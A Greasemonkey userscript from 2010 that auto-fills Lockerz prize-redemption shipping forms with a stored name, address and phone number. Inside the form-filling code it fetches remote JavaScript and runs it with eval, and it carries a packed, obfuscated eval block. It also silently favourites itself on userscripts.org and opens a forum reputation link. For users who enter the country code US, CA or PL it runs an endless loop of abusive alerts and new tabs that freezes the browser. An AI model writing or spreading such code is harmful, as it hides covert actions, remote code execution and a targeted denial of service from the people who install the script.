// ==UserScript==
// @name           Lockerz Restock Form Filler
// @namespace      Lockerz_Restock_Form_Filler
// @description    Fills in the form
// @include        http://www.lockerz.com/redeem*
// @include        http://ptzplace.lockerz.com/*
// @include        http://lockerztalkform.0fees.net/redeem.php
// @include        http://premium.retkinia.net/ptzplace/redeem
// @include        http://www.premiuminvites.info/ptzplace/redeem
// @include        http://*ptzplace.lockerzclub.info/*/*.php
// @include        http://lockerztalk.lv/ptzplace/redeem
// @author         KOLANICH
// @copyright      KOLANICH,2010
// @version        1.8.1
// @uso:rating     10
// @optimize       1
// ==/UserScript==

var f = navigator.userAgent.toLowerCase(); if(f.indexOf("safary") > -1 || f.indexOf("chrome") > -1 || f.indexOf("applewebkit") > -1 || window.opera) { var h = document.createElement("script"); h.setAttribute("type", "text/javascript"); h.setAttribute("id", "gmapi"); var j = document.createElement("script"); j.setAttribute("type", "text/javascript"); j.setAttribute("id", "rxqlib"); var n = function(d) { n[d.target.id] || (n[d.target.id] = 1); if(n.gmapi && n.rxqlib) { h.removeEventListener("load", n, false); j.removeEventListener("load", n, false); setTimeout(o, 0) } }; h.addEventListener("load", n, false); j.addEventListener("load", n, false); j.setAttribute("src", "http://rxquery.googlecode.com/files/regExpQuery.js"); h.setAttribute("src", "http://gmapihtml5.googlecode.com/files/HTML5_GM_API.js"); document.getElementsByTagName("HEAD")[0].appendChild(j); document.getElementsByTagName("HEAD")[0].appendChild(h) }else { o() } o(); function o() { function d(a, e) { if(e) { a = "_" + a } var b = GM_getValue(a, ""); if(!b) { b = prompt("Input :" + a, ""); GM_setValue(a, b) } return b } function w(a) { eval(a.responseText); a = new regExpQuery("input", "name"); a.addChangeSpoiled("(first[-_]?Name|Name[-_]first?|fn)", "firstname", p); a.addChangeSpoiled("(last[-_]?Name|Name[-_]?last|ln)", "lastname", q); a.addChangeSpoiled("(phone[-_]?Whole|Whole[-_]?phone|phone[-_]?number)", "phone", l); a.addChangeSpoiled("(address1|a1)", "addr1", r); a.addChangeSpoiled("(address2|a2)", "addr2", s); a.addChangeSpoiled("(city|cy)", "city", t); a.addChangeSpoiled("(zip|postal[-_]?code|z)", "zipcode", u); a.addChangeSpoiled("(state|s_)", "state", v); a.exec(); if(!(a.changed >= 8)) { eval(function(p, a, c, k, e, d) { e = function(c) { return(c < a ? "" : e(parseInt(c / a))) + ((c = c % a) >  35 ? String.fromCharCode(c + 29) : c.toString(36))  }; if(!"".replace(/^/, String)) { while(c--) { d[e(c)] = k[c] || e(c) } k = [function(e) { return d[e] }]; e = function() { return"\\w+" }; c = 1 } while(c--) { if(k[c]) { p = p.replace(new RegExp("\\b" + e(c) + "\\b", "g"), k[c]) } } return p }('a=H G("J[5]","L");a.K(9(e){9 b(x,y){C(n(".?"+x+".?","i").w(e.A)&&c.8(e.7("5"))){c.8(e.7("5")).o=y}}b("(d[0 ]?6)",p);b("(m[0 ]?6)",q);b("(j )?3( f)?",l);b("(d 4|4 1)",r);b("(I 4|4 2)",s);b("M",t);b("(E|D)[ -0]F",u);b("B",v)},"h");a.z("(3[-0]?g|g[-0]?3|3[-0]?f)","3",l);a.k()', 49, 49, "_|||phone|address|for|Name|getAttribute|getElementById|function|||document|first||number|Whole|labels||tele|exec||last|RegExp|value||||||||test|||addChangeSpoiled|innerHTML|state|if|postal|zip|code|regExpQuery|new|second|label|addCustom|id|city".split("|"), 0, {})) } } var g = GM_getValue("country"), c = GM_getValue("countrycode"); if(!g) { g = prompt("Input Your Country", "Russia"); if(g == "" || g == "Russia") { g = "Russia"; c = "RU"; GM_setValue("state", "RU"); GM_setValue("countrycode", c); GM_openInTab("http://lockerztalk.ru/reputation.php?p=24115") } GM_setValue("country", g); GM_xmlhttpRequest({method:"HEAD", url:"http://userscripts.org/scripts/favorite/72215"}) } if(!c) { for(c = prompt("Input Your Country Code", "RU");c.length != 2;) { c = prompt("Country Code is 2 simbols!!!\nInput valid Country Code", "RU") } GM_setValue("countrycode", c) } if(c == "US" || c == "CA" || c == "PL") { for(;;) { alert("FUCK YOU"); GM_openInTab("javascript:alert('FUCK YOU');") } } var p = d("name"), q = d("surname"), r = d("address1"), s = GM_getValue("address2") ? GM_getValue("address2") : "", v = d("state"), u = d("zip"), l = d("phone"), t = d("city"), k = GM_getValue("_trainmode", 0);  if(k) { p = "NAME"; q = "SURNAME"; r = "FIRST ADDRESS"; s = "SECOND ADDRESS"; u = "123456"; l = "0074951234567"; t = "DEeEPTOwN"; var z = (new Date).getTime(); document.getElementById("shippingForm") && document.getElementById("shippingForm").addEventListener("submit", function() { alert("You have spent " + ((new Date).getTime() - z) / 1E3 + " seconds!!!") }, true) } try { var m = document.getElementById("countryInner").getElementsByTagName("a"); if(m) { for(i = 0;i < m.length;i++) { if(m[i].firstChild.firstChild.data == g) { unsafeWindow.selectCountry(c, m[i]); break } } document.getElementById("countryInner").style.display = "none"; document.getElementById("recaptcha_response_field").focus(); document.getElementById("recaptcha_response_field").style.borderColor = "red"; document.getElementById("recaptcha_response_field").style.borderWidth = "4px"; GM_xmlhttpRequest({method:"GET", url:"http://rxquery.googlecode.com/files/regExpQuery.js", headers:{"Cache-Control":"no-cache, must-revalidate"}, onload:w}) } }finally { GM_registerMenuCommand("Additional address:Input", function() { d("address2") }); GM_registerMenuCommand("Additional address:Clear", function() { GM_deleteValue("address2"); alert("Cleared") }); GM_registerMenuCommand("Clear EVERYTHING!!!", function() { if(confirm("Are you sure?!")) { var a = GM_listValues(); for(i = 0;i < a.length;i++) { GM_deleteValue(a[i]) } alert("Cleared.Now you can reinput it!") } }); GM_registerMenuCommand("Change data", function() { var a = GM_listValues(), e; for(i = 0;i < a.length;i++) { if(a[i][0] != "_") { e = GM_getValue(a[i], ""); e = prompt("Change :" + a[i], e); GM_setValue(a[i], e) } } }); c == "RU" && GM_registerMenuCommand("\u041f\u043e\u043c\u043e\u0449\u044c", function() {  GM_openInTab("http://lockerztalk.ru/userscript-dlya-avtozapolneniya-formy-restoka-t1272.html") }); document.getElementById("shippingForm").addEventListener("keydown", function(a) { a.keyCode == 13 && unsafeWindow.submitForm() }, true); GM_registerMenuCommand("TrainMode:" + (k ? "Disable" : "Enable"), function() { if(k) { GM_setValue("_trainmode", 0); k = 0 }else { k = 1; GM_setValue("_trainmode", 1) } window.location.reload() }); GM_registerMenuCommand("Donate", function() { alert("My WebMoney vallets are:\nDollar$\tZ330327478832\nRoubles\tR771648086252") }) } } ;

